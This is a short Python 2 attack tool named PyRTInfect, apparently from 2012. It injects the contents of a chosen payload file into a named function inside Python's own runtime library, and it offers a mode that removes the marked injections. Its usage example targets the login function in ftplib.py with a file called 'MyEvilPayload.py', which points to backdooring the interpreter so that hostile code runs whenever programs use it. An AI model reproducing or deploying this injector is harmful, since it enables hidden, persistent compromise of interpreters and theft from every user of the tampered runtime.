#!/usr/bin/python
#
# Coder   : Zer0Flag
# Date    : 18.06.2012
# Contact : zer0fl4g@googlemail.com
#
# Usage   : PyRTInfect.py -l <file you want inject into> -f <function you want inject into> -c <file you want to inject>
#           PyRTInfect.py -l <file you want to clean>
#
# Example : PyRTInfect.py -l C:\Python2.7\Lib\ftplib.py -f login -c C:\MyEvilPayload.py
#           PyRTInfect.py -l /usr/lib/python2.6/ftplib.py -f login -c /home/MyEvilPayload.py
#
# Tested  : Windows XP SP3 @ Python 2.7
#           Windows 7 SP1 @ Python 2.7
#           BackTrack 5 @ Python 2.6

import sys

def PrintUsage():
    print 'Usage:\n\t%s -l <file> -f <function> -c <file.to.inject>' % sys.argv[0]
    print '\t%s -l <file>\t#Clear all Injections' % sys.argv[0]
        
def InjectIntoRT(sFileToInfect,sFunctionToInfect,sFileToInject):
    if len(sFileToInfect) != 0 and len(sFunctionToInfect) != 0 and len(sFileToInject) != 0:
        sFTI = open(sFileToInfect,'r+')
        sFTIn = open(sFileToInject,'r+')
        
        bGoOn = True
        bWriteData = True
        iLineCounter = 0
        IWCount = 0
        sBackUpTFI = sFTI.readlines()
        sFTI.seek(0)
        
        while bGoOn:
            iLineCounter += 1
            sLine = sFTI.readline()
            if str(sLine).__contains__('def ' + sFunctionToInfect):
                print '[+] Function: \"%s\" found at %d' % (sFunctionToInfect,iLineCounter)
                print '[+] Going to Inject following lines!\n'
                sLinesToInject = sFTIn.readlines()
                for sLTI in sLinesToInject:
                    print sLTI
                    
                sFTI.seek(0) 
                while bWriteData:
                    try:
                        sFTI.write(sBackUpTFI[IWCount])
                        if IWCount == iLineCounter:
                            sFTI.write('\t#1:Injected\n')
                            sFTI.writelines(sLinesToInject)
                            sFTI.write('\n\t#2:Injected\n')
                        IWCount += 1
                    except IndexError,e:
                        bWriteData = False 
                bGoOn = False
        
        sFTI.close()
        sFTIn.close()
    else:
        return 0
    return 1

def ClearRTFile(sFileName):
    fRTFile = open(sFileName,'r+')
    fBackUp = fRTFile.readlines()
    fRTFile.seek(0)
    bWriteOk = True
    iCounter = 0
    
    for sLine in fBackUp:
        if str(sLine).__contains__('#1:Injected'):
            bWriteOk = False
            print '[+] Injected Line Found at %d' % iCounter
        elif str(sLine).__contains__('#2:Injected'):
            bWriteOk = True
            continue
            
        if bWriteOk:
            fRTFile.write(sLine)
        iCounter += 1
    return 1

if __name__ == "__main__":
    if len(sys.argv) < 3:
        PrintUsage()
    elif len(sys.argv) == 3:
        for i in range(0,len(sys.argv)):
            if sys.argv[i] == '-l':
                ClearRTFile(sys.argv[i + 1])               
    elif len(sys.argv) == 7:
        for i in range(0,len(sys.argv)):
            if sys.argv[i] == '-l':
                sFileToInfect = sys.argv[i + 1]
            elif sys.argv[i] == '-f':
                sFunctionToInfect = sys.argv[i + 1]
            elif sys.argv[i] == '-c':
                sFileToInject = sys.argv[i + 1]
                
        if InjectIntoRT(sFileToInfect,sFunctionToInfect,sFileToInject) == 0:
            PrintUsage()
